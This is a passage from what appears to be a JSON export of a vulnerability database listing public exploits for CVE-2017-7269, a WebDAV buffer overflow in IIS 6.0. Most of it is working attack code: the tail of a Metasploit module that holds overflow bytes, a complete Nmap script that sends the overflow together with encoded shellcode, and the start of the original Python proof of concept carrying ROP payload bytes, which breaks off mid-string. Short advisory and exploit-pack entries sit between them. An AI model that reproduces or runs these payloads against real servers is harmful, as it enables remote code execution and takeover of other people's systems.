\n'Payload' =>  \n{  \n'Space' => 2000,  \n'BadChars' => \"\\x00\",  \n'EncoderType' => Msf::Encoder::Type::AlphanumUnicodeMixed,  \n'DisableNops' => 'True',  \n'EncoderOptions' =>  \n{  \n'BufferRegister' => 'ESI',  \n}  \n},  \n'DefaultOptions' =>  \n{  \n'EXITFUNC' => 'process',  \n'PrependMigrate' => true,  \n},  \n'Targets' =>  \n[  \n[  \n'Microsoft Windows Server 2003 R2 SP2',  \n{  \n'Platform' => 'win',  \n},  \n],  \n],  \n'Platform' => 'win',  \n'DisclosureDate' => 'Mar 26 2017',  \n'DefaultTarget' => 0))  \n  \nregister_options(  \n[  \nOptString.new('TARGETURI', [ true, 'Path of IIS 6 web application', '/']),  \nOptInt.new('MINPATHLENGTH', [ true, 'Start of physical path brute force', 3 ]),  \nOptInt.new('MAXPATHLENGTH', [ true, 'End of physical path brute force', 60 ]),  \n])  \nend  \n  \ndef min_path_len  \ndatastore['MINPATHLENGTH']  \nend  \n  \ndef max_path_len  \ndatastore['MAXPATHLENGTH']  \nend  \n  \ndef supports_webdav?(headers)  \nif headers['MS-Author-Via'] == 'DAV' ||  \nheaders['DASL'] == '<DAV:sql>' ||  \nheaders['DAV'] =~ /^[1-9]+(,\\s+[1-9]+)?$/ ||  \nheaders['Public'] =~ /PROPFIND/ ||  \nheaders['Allow'] =~ /PROPFIND/  \nreturn true  \nelse  \nreturn false  \nend  \nend  \n  \ndef check  \nres = send_request_cgi({  \n'uri' => target_uri.path,  \n'method' => 'OPTIONS'  \n})  \nif res && res.headers['Server'].include?('IIS/6.0') && supports_webdav?(res.headers)  \nreturn Exploit::CheckCode::Vulnerable  \nelsif res && supports_webdav?(res.headers)  \nreturn Exploit::CheckCode::Detected  \nelsif res.nil?  \nreturn Exploit::CheckCode::Unknown  \nelse  \nreturn Exploit::CheckCode::Safe  \nend  \nend  \n  \ndef exploit  \n# extract the local servername and port from a PROPFIND request  \n# these need to be the values from the backend server  \n# if testing a reverse proxy setup, these values differ  \n# from RHOST and RPORT but can be extracted this way  \nvprint_status(\"Extracting ServerName and Port\")  \nres = send_request_raw(  \n'method' => 'PROPFIND',  \n'headers' => {  \n'Content-Length' => 0  \n},  \n'uri' => target_uri.path  \n)  \nfail_with(Failure::BadConfig, \"Server did not respond correctly to WebDAV request\") if(res.nil? || res.code != 207)  \n  \nxml = res.get_xml_document  \nurl = URI.parse(xml.at(\"//a:response//a:href\").text)  \nserver_name = url.hostname  \nserver_port = url.port  \nserver_scheme = url.scheme  \n  \nhttp_host = \"#{server_scheme}://#{server_name}:#{server_port}\"  \nvprint_status(\"Using http_host #{http_host}\")  \n  \nmin_path_len.upto(max_path_len) do |path_len|  \nvprint_status(\"Trying path length of #{path_len}...\")  \n  \nbegin  \nbuf1 = \"<#{http_host}/\"  \nbuf1 << rand_text_alpha(114 - path_len)  \nbuf1 << \"\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac\"  \nbuf1 << \">\"  \nbuf1 << \" (Not <locktoken:write1>) <#{http_host}/\"  \nbuf1 << rand_text_alpha(114 - path_len)  \nbuf1 << \"\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\"  \nbuf1 << payload.encoded  \nbuf1 << \">\"  \n  \nvprint_status(\"Sending payload\")  \nres = send_request_raw(  \n'method' => 'PROPFIND',  \n'headers' => {  \n'Content-Length' => 0,  \n'If' => \"#{buf1}\"  \n},  \n'uri' => target_uri.path  \n)  \nif res  \nvprint_status(\"Server returned status #{res.code}\")  \nif res.code == 502 || res.code == 400  \nnext  \nelsif session_created?  \nreturn  \nelse  \nvprint_status(\"Unknown Response: #{res.code}\")  \nend  \nend  \nrescue ::Errno::ECONNRESET  \nvprint_status(\"got a connection reset\")  \nnext  \nend  \nend  \nend  \nend  \n  \n`\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:142471"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2017-04-08T00:00:00",
            "published": "2017-04-08T00:00:00",
            "href": "https://packetstormsecurity.com/files/142060/MS-IIS-6.0-Buffer-Overflow-NSE-Script.html",
            "id": "PACKETSTORM:142060",
            "type": "packetstorm",
            "title": "MS IIS 6.0 Buffer Overflow NSE Script",
            "sourceData": "`local nmap = require \"nmap\"  \nlocal string = require \"string\"  \nlocal shortport = require \"shortport\"  \nlocal vulns = require \"vulns\"  \n  \n-- NSE Buffer Overflow vulnerability in IIS  \n  \ndescription = [[  \nBuffer overflow in the ScStoragePathFromUrl function in the WebDAV service  \nin Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows  \nremote attackers to execute arbitrary code via a long header beginning with http protocol.  \n]]  \n  \n---  \n-- @usage  \n-- ./nmap iis-buffer-overflow <target>  \n--  \n-- @output  \n-- PORT STATE SERVICE  \n-- 80/tcp open http  \n-- | iis-buffer-overflow:  \n-- | VULNERABLE: Buffer Overflow in IIS 6 and Windows Server 2003 R2  \n-- | State: LIKELY_VULNERABLE  \n-- | Risk factor: High CVSS: 10.0  \n-- | Description:  \n-- | Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service  \n-- | in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows  \n-- | remote attackers to execute arbitrary code via a long header beginning with http protocol.  \n-- |  \n-- | References:  \n-- | https://github.com/edwardz246003/IIS_exploit,  \n-- |_ https://0patch.blogspot.in/2017/03/0patching-immortal-cve-2017-7269.html  \n--  \n  \nauthor = {  \n\"Zhiniang Peng\", -- Original author  \n\"Chen Wu\", -- Original author  \n\"Rewanth Cool\" -- NSE script author  \n}  \nlicense = \"Same as Nmap--See https://nmap.org/book/man-legal.html\"  \ncategories = {\"exploit\", \"vuln\", \"intrusive\"}  \n  \nportrule = shortport.portnumber(80, \"tcp\")  \n  \naction = function(host, port)  \nlocal socket, response, try, catch, payload, shellcode, vulnerable_name  \n  \nlocal vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)  \nlocal vuln = {  \ntitle = 'Buffer Overflow in IIS 6 and Windows Server 2003 R2',  \nstate = vulns.STATE.NOT_VULN,  \nrisk_factor = \"High\",  \ndescription = [[  \nBuffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0  \nin Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning  \nwith \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016.  \n  \nOriginal exploit by Zhiniang Peng and Chen Wu.  \n]],  \nIDS = {  \nCVE = 'CVE-2017-7269'  \n},  \nscores = {  \nCVSS = '10.0'  \n},  \nreferences = {  \n'https://github.com/edwardz246003/IIS_exploit',  \n'https://0patch.blogspot.in/2017/03/0patching-immortal-cve-2017-7269.html'  \n},  \ndates = {  \ndisclosure = {year = '2017', month = '03', day = '26'},  \n}  \n}  \n  \n-- If domain name doesn't exist this line of code takes ip into consideration  \nvulnerable_name = host.targetname or host.ip  \n  \nsocket = nmap.new_socket()  \ncatch = function()  \nsocket:close()  \nend  \n  \ntry = nmap.new_try(catch)  \ntry(socket:connect(host, port))  \n  \n-- Sending the heavy payload for testing buffer overflow attack  \npayload = 'PROPFIND / HTTP/1.1\\r\\nHost: ' .. vulnerable_name .. '\\r\\nContent-Length: 0\\r\\n'  \npayload = payload .. 'If: <http://' .. vulnerable_name .. '/aaaaaaa'  \npayload = payload .. '\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd'  \npayload = payload .. '\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5'  \npayload = payload .. '\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91'  \npayload = payload .. '\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80'  \npayload = payload .. '\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3'  \npayload = payload .. '\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4'  \npayload = payload .. '\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88'  \npayload = payload .. '\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7'  \npayload = payload .. '\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab'  \npayload = payload .. '\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80'  \npayload = payload .. '\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6'  \npayload = payload .. '\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88'  \npayload = payload .. '\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5'  \npayload = payload .. '\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83'  \npayload = payload .. '\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d'  \npayload = payload .. '\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7'  \npayload = payload .. '\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'  \n  \npayload = payload .. '>'  \npayload = payload .. ' (Not <locktoken:write1>) <http://' .. vulnerable_name .. '/bbbbbbb'  \npayload = payload .. '\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6'  \npayload = payload .. '\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5'  \npayload = payload .. '\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7'  \npayload = payload .. '\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5'  \npayload = payload .. '\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5'  \npayload = payload .. '\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4'  \npayload = payload .. '\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6'  \npayload = payload .. '\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3'  \npayload = payload .. '\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7'  \npayload = payload .. '\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5'  \npayload = payload .. '\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7'  \npayload = payload .. '\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6'  \npayload = payload .. '\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5'  \npayload = payload .. '\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6'  \npayload = payload .. '\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7'  \npayload = payload .. '\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae'  \npayload = payload .. '\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80'  \npayload = payload .. '\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c'  \npayload = payload .. '\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0'  \npayload = payload .. '\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8'  \npayload = payload .. '\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'  \n  \nshellcode = 'VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA'  \nshellcode = shellcode .. 'BAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V'  \nshellcode = shellcode .. '3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O0'  \nshellcode = shellcode .. '2LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ'  \nshellcode = shellcode .. '2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1'  \nshellcode = shellcode .. 'KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'  \n  \npayload = payload .. shellcode  \npayload = payload .. '>\\r\\n\\r\\n'  \n  \n-- Exploiting the vulnerability  \ntry(socket:send(payload))  \n  \n-- We receive a 200 response if the payload succeeds.  \nresponse = try(socket:receive_bytes(80960))  \nsocket:close()  \n  \n-- Checking for 200 response in the response  \nlocal regex = \"HTTP/1.1 (%d+)\"  \nlocal status = string.match(response, regex)  \n  \nif status == '200' then  \n-- Buffer overflow is successfully executed on the server.  \nvuln.state = vulns.STATE.EXPLOIT,  \nvuln.exploit_results = response  \nelseif status == '400' then  \n-- Bad request error is occured because webdav is not installed.  \nvuln.state = vulns.STATE.LIKELY_VULN,  \nvuln.exploit_results = \"Server returned 400: Install webdav and try again.\"  \nelseif status == '502' then  \n-- Likely to have an error in the Server Name  \nvuln.state = vulns.STATE.LIKELY_VULN,  \nvuln.exploit_results = \"Server returned 502: Please try to change ServerName and run the exploit again\"  \nelseif status ~= nil then  \nvuln.exploit_results = response  \nend  \nreturn vuln_report:make_output(vuln)  \n  \nend  \n  \n`\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:142060"
        },
        {
            "bulletinFamily": "exploit",
            "description": "In Windows Server 2003 IIS6. 0 the WebDAV service ScStoragePathFromUrl a function of the presence buffer overflow vulnerability, an attacker by a order\u201cIf: &lt;http://\u201d at the beginning of a longer `header `head `PROPFIND `request arbitrary code execution. Currently the vulnerability for install IIS6 Windows Server 2003 R2 system can be stabilized using the vulnerability as early as 2016, 7,8 month would have started on the outside is the use. \n\nUse the following PoC test in the target server back-end perform `calc.exe`, testing the PoC in the IIS default site to open the `WebDAV `extension be reproducible. As follows:  \n![](https://images.seebug.org/1490690082298)\n",
            "modified": "2017-03-28T00:00:00",
            "published": "2017-03-28T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-92834",
            "id": "SSV:92834",
            "type": "seebug",
            "title": "IIS 6.0 WebDAV remote code execution vulnerability (CVE-2017-7269)",
            "sourceData": "",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:92834"
        },
        {
            "bulletinFamily": "exploit",
            "description": "**Name**|  iis6_propfind  \n---|---  \n**CVE**|  CVE-2017-7269  \n**Exploit Pack**|  [CANVAS](<http://http://www.immunityinc.com/products-canvas.shtml>)  \n**Description**| IIS 6.0 PROPFIND ScStoragePathFromUrl Stack Buffer Overflow  \n**Notes**| References: ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269', 'https://github.com/edwardz246003/IIS_exploit']  \nCVE Name: CVE-2017-7269  \nVENDOR: Microsoft  \nRepeatability: Infinite  \nNote: Malformed PROPFIND request cause remote shellcode execution  \n\n",
            "modified": "2017-03-27T02:59:00",
            "published": "2017-03-27T02:59:00",
            "href": "http://exploitlist.immunityinc.com/home/exploitpack/CANVAS/iis6_propfind",
            "id": "IIS6_PROPFIND",
            "title": "Immunity Canvas: IIS6_PROPFIND",
            "type": "canvas",
            "cvss": {
                "score": 10.0,
                "vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/canvas/IIS6_PROPFIND"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for windows platform in category remote exploits",
            "modified": "2017-03-27T00:00:00",
            "published": "2017-03-27T00:00:00",
            "href": "https://0day.today/exploit/description/27446",
            "id": "1337DAY-ID-27446",
            "type": "zdt",
            "title": "Internet Information Services (IIS) 6.0 WebDAV - ScStoragePathFromUrl Buffer Overflow Exploit",
            "sourceData": "'''\r\nDescription:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with \"If: <http://\" in a PROPFIND request, as exploited in the wild in July or August 2016.\r\n \r\nAdditional Information: the ScStoragePathFromUrl function is called twice\r\nVulnerability Type: Buffer overflow\r\nVendor of Product: Microsoft\r\nAffected Product Code Base: Windows Server 2003 R2\r\nAffected Component: ScStoragePathFromUrl\r\nAttack Type: Remote\r\nImpact Code execution: true\r\nAttack Vectors: crafted PROPFIND data\r\n \r\nHas vendor confirmed or acknowledged the vulnerability?:true\r\n \r\nDiscoverer:Zhiniang Peng and Chen Wu.\r\nInformation Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China\r\n'''\r\n \r\n#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.\r\n#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China \r\n#-----------Email: [email\u00a0protected]\r\n \r\nimport socket  \r\n \r\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  \r\nsock.connect(('127.0.0.1',80))  \r\n \r\npay='PROPFIND / HTTP/1.1\\r\\nHost: localhost\\r\\nContent-Length: 0\\r\\n'\r\npay+='If: <http://localhost/aaaaaaa'\r\npay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\